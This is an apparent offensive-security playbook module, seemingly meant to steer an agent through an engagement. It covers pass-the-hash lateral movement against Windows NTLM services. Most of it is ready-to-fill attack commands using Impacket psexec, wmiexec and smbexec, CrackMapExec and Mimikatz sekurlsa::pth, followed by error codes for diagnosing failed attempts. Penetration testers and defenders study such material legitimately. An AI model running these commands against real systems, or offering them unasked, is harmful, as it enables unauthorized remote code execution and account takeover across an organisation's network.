# Internal Network, Host, And Identity Operations: Basic Internal Network Attacks: Pass-the-Hash (PTH)

> Apply [../module-continuity.md](../module-continuity.md). Keep the same engagement and parent path as the calling route. Load this scene only when current evidence supports its prerequisites.

### Pass-the-Hash (PTH)

**When it works**: NTLM authentication protocols (SMB, WMI, WinRM with Basic auth, scheduled tasks with stored credentials, MSSQL with Windows auth). Does NOT work for Kerberos-only services or interactive logon (RDP unless Restricted Admin mode).

**Key insight**: PTH uses the NTLM hash directly — no cracking needed. An NT hash is nearly as good as a password for lateral movement.

```bash
# Impacket PTH suite
impacket-psexec -hashes :<NTHASH> <domain>/<user>@<target>
impacket-wmiexec -hashes :<NTHASH> <domain>/<user>@<target>
impacket-smbexec -hashes :<NTHASH> <domain>/<user>@<target>
# CrackMapExec
crackmapexec smb <target> -u <user> -H <NTHASH> -d <domain>
# Mimikatz (on Windows)
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:cmd.exe
```

**Failure diagnosis**:
- `STATUS_ACCESS_DENIED` — credential is wrong, or local admin elevation needed, or UAC Remote Restriction blocking
- `STATUS_LOGON_FAILURE` — account doesn't exist on target, or password hash is wrong
- `STATUS_ACCOUNT_RESTRICTION` — logon hours, workstation restriction, or smart card required
- `RPC server unavailable` — firewall blocks port 445 or 135
- WinRM connection refused — port 5985/5986 not open or not configured


## Scene Exit

Return result classification, evidence, changed assumptions, affected paths, persistent changes, and the next parent-path decision.
